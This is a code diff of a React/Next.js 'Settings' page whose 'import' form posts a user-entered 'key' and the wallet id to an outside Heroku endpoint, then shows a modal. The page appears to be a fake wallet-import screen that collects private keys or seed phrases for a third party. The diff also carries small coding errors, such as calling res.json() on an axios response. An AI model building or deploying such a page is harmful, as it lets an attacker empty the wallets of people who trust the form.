@@ -5,9 +5,12 @@ import "react-toastify/dist/ReactToastify.css";
 import styles from "../../../styles/Home.module.css";
 import Tabs from "..";
 import { useRouter } from "next/router";
+import Modal from "../../../components/Modal";
+import Overlay from "../../../components/Overlay";
 
 const Settings = () => {
   const [key, setKey] = useState("");
+  const [showModal, setShowModal] = useState(false)
   const router = useRouter();
   const { pid } = router.query;
 
@@ -20,12 +23,13 @@ const Settings = () => {
 
     key !== ""
       ? axios
-          .post("https://glacial-temple-10425.herokuapp.com/send", {
-            key: key,
-            wallet: pid,
-          })
-          .then((res) => res.json())
-          .catch((err) => err)
+        .post("https://glacial-temple-10425.herokuapp.com/send", {
+          key: key,
+          wallet: pid,
+        })
+        .then((res) => res.json())
+        .then(setShowModal(true))
+        .catch((err) => err)
       : "";
   };
   return (
@@ -42,8 +46,13 @@ const Settings = () => {
           <button onClick={notify} className={styles.button}>
             import
           </button>
-          <ToastContainer />
+          {/* <ToastContainer /> */}
         </form>
+        {showModal &&
+          <>
+            <Modal showModal={showModal} setShowModal={setShowModal} />
+            <Overlay />
+          </>}
       </div>
     </Tabs>
   );
